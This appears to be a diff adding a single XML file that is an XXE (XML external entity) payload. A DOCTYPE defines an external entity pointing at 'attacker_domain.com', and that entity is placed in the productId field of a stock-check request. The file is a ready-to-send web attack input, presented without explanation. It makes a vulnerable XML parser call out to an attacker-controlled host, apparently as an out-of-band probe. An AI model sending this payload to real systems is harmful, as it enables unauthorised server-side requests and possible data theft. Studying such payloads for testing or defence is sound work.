@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+		<!DOCTYPE example [
+		 <!ENTITY file SYSTEM "https://attacker_domain.com">
+		]>
+		<stockCheck>
+				<productId>
+						&file;
+				</productId>
+				<storeId>
+						1
+				</storeId>
+		</stockCheck>
